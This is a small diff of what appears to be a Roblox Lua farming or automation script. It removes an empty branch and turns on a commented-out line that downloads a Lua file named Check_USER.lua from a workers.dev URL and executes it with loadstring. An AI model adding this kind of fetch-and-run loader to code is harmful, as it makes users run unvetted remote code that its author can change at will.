@@ -66,11 +66,8 @@ end
 if _G.Restart == true then
 	_G.Restart = false 	
 end
-		if EVENT_or_FARM == "E" then	
-			--
-		end
 
---loadstring(game:HttpGet("https://plain-cell-d3e8.kuvyndn.workers.dev/Check_USER.lua"))()
+loadstring(game:HttpGet("https://plain-cell-d3e8.kuvyndn.workers.dev/Check_USER.lua"))()
 
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
